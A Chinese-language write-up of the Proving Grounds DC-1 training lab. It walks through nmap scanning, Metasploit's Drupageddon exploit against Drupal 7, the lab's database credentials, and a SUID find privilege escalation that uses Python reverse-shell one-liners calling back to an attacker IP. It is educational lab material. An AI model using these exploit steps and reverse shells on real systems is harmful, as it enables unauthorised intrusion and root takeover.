# Proving Grounds->DC-1 靶场笔记

### 惯例先扫ip段

```
nmap -sn -v 192.168.218.0/24
```

只有192.168.218.193、192.168.218.254（网关）

### 对192.168.218.193进行端口扫描

```
nmap -p- -sV -sC --open 192.168.218.193
```

扫描结果如下

```
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey:
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46232/tcp   status
|   100024  1          48086/tcp6  status
|   100024  1          53990/udp   status
|_  100024  1          57904/udp6  status
46232/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

出货不少，22、80、111、46232

80进去看是Drupal Site的登录

进去新建用户。发现admin已经被占用了

也没有注入的地方

中间件是Apache 2.2

CMS是Drupal 7，国外挺有名的

searchsploit看看有没有洞

![image-20230418170902641](https://s2.loli.net/2023/04/23/Iqwlk6yvxusLcK7.png)

好家伙，重点看下Drupageddon

Drupageddon 是 Drupal 版本 <7.32 中暴露的一个漏洞。  它允许远程代码执行和 shell 访问。 

使用 msfconsole 看看exp能不能一发入魂吧

![image-20230418165637164](https://s2.loli.net/2023/04/23/txvpeqoZLJ76lDw.png)



search drupageddon 搜一下



![image-20230418171829029](https://s2.loli.net/2023/04/23/uelXnQs6URY4rM9.png)

加载这个exp

use exploit/multi/http/drupal_drupageddon

![image-20230418172218547](https://s2.loli.net/2023/04/23/vNTPylkObd18cfM.png)

show options看下需要哪些参数

![image-20230418172416752](https://s2.loli.net/2023/04/23/UMZF439LrQnVDRl.png)

需要RHOST（靶机ip）、LHOST（你的ip）

```
set RHOST 192.168.213.193
set LHOST 192.168.45.5
run 如果没连上就多run几次
getuid
```

![image-20230418203800016](https://s2.loli.net/2023/04/23/BNHOfAv4jJpsmT6.png)

先ls看一眼
找到了flag1.txt
提示我去看配置文件 但是我没着急去找配置文件

![image-20230418185608663](https://s2.loli.net/2023/04/23/OH5RJInsaCefrty.png)

我又看了下passwd
cat /etc/passwd

![image-20230418185724614](https://s2.loli.net/2023/04/23/iKVzhIxQs67FnvA.png)

```
找到了flag4用户，我决定去home目录看看
cd /home/
ls -al
发现确实有flag4目录，但是还有一个local.txt
cat local.txt 第一个flag到手
60e98b8e80b9279ff2e814d6f5728268
```

![image-20230418204100909](https://s2.loli.net/2023/04/23/uTrZvRGyEQxcKMz.png)

cd flag看下
找到flag4.txt

![image-20230418190020805](https://s2.loli.net/2023/04/23/Ne1UTAqPZQO4rc2.png)

提示我们去root目录，root权限肯定是没有的。该怎么办呢

回过头再找这个cms的配置文件位置
cat /var/www/sites/default/settings.php 

```
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',

```

```
得到了数据库的名字、用户名、密码,提示我们看看这些凭据能做什么
看看有没有mysql进程吧
ps -ef|grep 'mysql'
```



![image-20230418190441362](https://s2.loli.net/2023/04/23/cLNFCIpmfETaO8P.png)

```
直接连mysql会提示mysql不存在
mysql -u dbuser -p
报错
[-] Unknown command: mysql
甚至连whoami都执行不了
进到shell里面
whoai
id
```

<img src="https://s2.loli.net/2023/04/23/L1JEWaOsAM8DTwc.png" alt="image-20230418204759202" style="zoom:80%;" />

试一下mysql登录

```
mysql -u dbuser -p
r0ck3t
use drupaldb;
select * from users;
登录直接给拒绝了
```

![image-20230418205354935](https://s2.loli.net/2023/04/23/njDT9gpmyF7seYo.png)

```
看看能不能直接提权，试一下find
find `which find` -exec whoami \;

常规操作利用find 反弹shell

先本机监听
nc -lvvnp 9919
靶机再开端口
find /etc/passwd -exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",9919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;

find /etc/passwd -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",9919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-ip"]);' \;
有的表哥的脚本是-ip 有的是-p 我的-ip一直连不上就用的-p

```

![image-20230418210018483](https://s2.loli.net/2023/04/23/rdFhXPbuSD9mBQR.png)

```
whoami 确定root权限，之后一发入魂
ls -al
pwd
cat flag4.txt
cd /root
ls -al
cat thefinalflg.txt
cat proof.txt
```

![image-20230418210445505](https://s2.loli.net/2023/04/23/2LB5yobFnX7RDuP.png)

```
这时候咱们再看看mysql，还是不让进，endl
有些靶场在你连接到shell之后，会在一两分钟给你退掉，所以，在连上之后，先稳定shell
https://overthewire.org/wargames/bandit/
find / -user root -perm -4000 -print 2>/dev/null
https://gtfobins.github.io/
```

![image-20230418211129416](https://s2.loli.net/2023/04/23/WZVcqyLYX23DThF.png)
